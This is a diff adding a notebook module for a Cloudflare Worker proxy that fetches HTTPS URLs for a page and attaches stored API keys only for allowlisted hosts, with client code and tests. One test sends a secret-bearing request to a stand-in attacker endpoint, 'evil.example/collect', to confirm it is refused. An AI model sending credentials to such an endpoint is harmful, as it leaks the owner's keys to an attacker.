@@ -1,0 +1,143 @@
+md`# brain-proxy
+
+A Cloud Brain recipe: \`com.lopecode.brain.proxy.fetch\` fetches a URL for the owner's tab, or for a caller holding a token that names the method. It is for an API that sends no CORS headers, and for a call that needs a key the page should not hold.
+
+\`\`\`js
+import {proxyFetch} from "@tomlarkworthy/brain-proxy"
+
+pfetch = proxyFetch("https://brain.example")                 // on the Brain's own page: the session it keeps
+r = await pfetch("https://openrouter.ai/api/v1/models", { secret: true })
+\`\`\`
+
+With \`secret: true\` the Worker adds the header listed for that host in \`proxyHosts\`, and refuses any other host before making a request. Add a row to \`proxyHosts\` and Apply to allow another host; the secret's name has to be written out, because the deployer binds the secrets a service names.
+
+Only \`https:\` URLs are fetched. A request body is text. A function on a Worker calls \`fetch\` itself and names its own secret; this recipe is for pages.`
+// %%
+proxyHosts = [
+  { host: "openrouter.ai", header: "authorization", prefix: "Bearer ", secret: async () => await secrets.OPENROUTER_API_KEY },
+  { host: "api.anthropic.com", header: "x-api-key", prefix: "", secret: async () => await secrets.ANTHROPIC_API_KEY }
+]
+// %%
+proxy_service = cloudflare.Service(
+  "proxy",
+  async (request) => {
+    const json = (status, error, message) => new Response(JSON.stringify({ error, message }), { status, headers: { "content-type": "application/json" } });
+    const { url, method = "GET", headers = {}, body = null, secret = false } = await request.json();
+    let target;
+    try {
+      target = new URL(url);
+    } catch {
+      return json(400, "InvalidRequest", "url");
+    }
+    if (target.protocol !== "https:") return json(400, "InvalidRequest", "only https: is fetched");
+    const out = new Headers(headers);
+    for (const h of ["cookie", "host", "origin", "referer"]) out.delete(h);
+    if (secret) {
+      const rule = proxyHosts.find((h) => h.host === target.hostname);
+      if (!rule) return json(403, "Forbidden", `no secret is allowed for ${target.hostname}`);
+      // A secret that was never set is bound as an empty string.
+      const value = await rule.secret();
+      if (!value) return json(400, "InvalidRequest", `the secret for ${target.hostname} is not set`);
+      out.set(rule.header, rule.prefix + value);
+    }
+    // With a secret attached a redirect is returned, not followed: another host must not receive the key.
+    const r = await fetch(target.href, { method, headers: out, body: body == null || method === "GET" ? undefined : body, redirect: secret ? "manual" : "follow" });
+    const back = new Headers({ "x-proxy-upstream": String(r.status) });
+    for (const h of ["content-type", "location", "retry-after"]) if (r.headers.get(h)) back.set(h, r.headers.get(h));
+    return new Response(r.body, { status: r.status, headers: back });
+  },
+  { methods: { "com.lopecode.brain.proxy.fetch": { type: "procedure", who: "owner" } } }
+)
+// %%
+proxy_announce = {
+  plugins.add("workers", proxy_service, { invalidation });
+  return "announced proxy_service";
+}
+// %%
+// A fetch for a page. A response without x-proxy-upstream came from the Brain, not the upstream, and is thrown.
+proxyFetch = (brainBase, { token = null, fetch: send = (...a) => fetch(...a) } = {}) =>
+  async (url, { method = "GET", headers = {}, body = null, secret = false } = {}) => {
+    // With no token named, the session the Brain's page keeps for this origin.
+    const kept = () => {
+      try {
+        return globalThis.localStorage.getItem("brain_session");
+      } catch {
+        return null;
+      }
+    };
+    token = token || kept();
+    const r = await send(String(brainBase).replace(/\/$/, "") + "/xrpc/com.lopecode.brain.proxy.fetch", {
+      method: "POST",
+      credentials: "omit",
+      headers: { "content-type": "application/json", ...(token ? { authorization: "Bearer " + token } : {}) },
+      body: JSON.stringify({ url: String(url), method, headers: Object.fromEntries(new Headers(headers)), body, secret })
+    });
+    if (r.headers.get("x-proxy-upstream")) return r;
+    const e = await r.json().catch(() => ({}));
+    throw Object.assign(new Error(e.message || e.error || "proxy.fetch " + r.status), { status: r.status, error: e.error || "Error" });
+  }
+// %%
+md`## Tests`
+// %%
+proxyRig = async (options = {}) => {
+  const seen = [];
+  const sim = await simulate(proxy_service, {
+    secrets: { OPENROUTER_API_KEY: "sk-or-1", ANTHROPIC_API_KEY: "", BRAIN_KEY: "k" },
+    fetch: async (request) => {
+      seen.push({ url: request.url, method: request.method, authorization: request.headers.get("authorization"), cookie: request.headers.get("cookie"), body: request.method === "GET" ? null : await request.text() });
+      return new URL(request.url).pathname === "/moved"
+        ? new Response(null, { status: 302, headers: { location: "https://elsewhere.example/" } })
+        : new Response('{"ok":true}', { status: 200, headers: { "content-type": "application/json", "set-cookie": "a=b" } });
+    },
+    ...options
+  });
+  // The page's side, wired to the simulated Worker as the kernel and core would deliver it.
+  const pfetch = proxyFetch("https://brain.internal", { fetch: (url, init) => sim.fetch(url, { ...init, headers: { ...init.headers, "x-brain-caller": "owner" } }) });
+  return { sim, seen, pfetch };
+}
+// %%
+test_proxy_adds_a_secret_only_for_its_host = {
+  const rig = await proxyRig();
+  const r = await rig.pfetch("https://openrouter.ai/api/v1/chat/completions", { method: "POST", body: '{"m":1}', headers: { cookie: "x=1", "content-type": "application/json" }, secret: true });
+  expect(r.status).toBe(200);
+  expect(await r.json()).toEqual({ ok: true });
+  expect(r.headers.get("set-cookie")).toBe(null);
+  expect(rig.seen).toEqual([{ url: "https://openrouter.ai/api/v1/chat/completions", method: "POST", authorization: "Bearer sk-or-1", cookie: null, body: '{"m":1}' }]);
+  let refused = null;
+  try { await rig.pfetch("https://evil.example/collect", { secret: true }); } catch (e) { refused = e; }
+  expect(refused).toMatchObject({ status: 403, message: "no secret is allowed for evil.example" });
+  expect(rig.seen.length).toBe(1);
+  return "1 upstream request, 1 refusal";
+}
+// %%
+test_proxy_plain_fetch_and_refusals = {
+  const rig = await proxyRig();
+  const r = await rig.pfetch("https://no-cors.example/data");
+  expect(r.headers.get("x-proxy-upstream")).toBe("200");
+  expect(rig.seen[0].authorization).toBe(null);
+  const fails = async (url, init) => rig.pfetch(url, init).then(() => null, (e) => e.message);
+  expect(await fails("http://plain.example/")).toBe("only https: is fetched");
+  expect(await fails("not a url")).toBe("url");
+  // The secret is named for the host and not set on this Brain.
+  expect(await fails("https://api.anthropic.com/v1/messages", { secret: true })).toBe("the secret for api.anthropic.com is not set");
+  // A redirect is handed back when a key was attached.
+  const moved = await rig.pfetch("https://openrouter.ai/moved", { secret: true });
+  expect([moved.status, moved.headers.get("location")]).toEqual([302, "https://elsewhere.example/"]);
+  expect(rig.seen.map((s) => new URL(s.url).hostname)).toEqual(["no-cors.example", "openrouter.ai"]);
+  return "3 refusals with no upstream request";
+}
+// %%
+test_proxy_declares_what_it_needs = {
+  const { meta } = await proxy_service.emit();
+  expect(meta.worker).toBe("brain-x-proxy");
+  expect(meta.secrets).toEqual(["ANTHROPIC_API_KEY", "OPENROUTER_API_KEY"]);
+  expect(meta.access).toEqual({ "com.lopecode.brain.proxy.fetch": { type: "procedure", who: "owner" } });
+  expect(meta.resources).toEqual([]);
+  return meta.secrets.join(", ");
+}
+// %%
+import {cloudflare, secrets, simulate} from "@tomlarkworthy/cloudflare-iac"
+// %%
+import {plugins} from "@tomlarkworthy/plugin-registry"
+// %%
+import {expect} from "@tomlarkworthy/jest-expect-standalone"
